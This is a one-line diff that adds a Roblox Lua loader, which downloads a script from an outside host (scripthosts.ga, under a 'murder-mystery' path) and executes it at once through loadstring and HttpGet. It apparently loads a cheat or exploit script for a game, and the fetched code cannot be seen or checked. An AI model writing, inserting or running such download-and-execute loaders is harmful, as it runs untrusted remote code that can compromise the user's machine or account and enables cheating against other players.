@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('http://scripthosts.ga/murder-mystery/main'))()
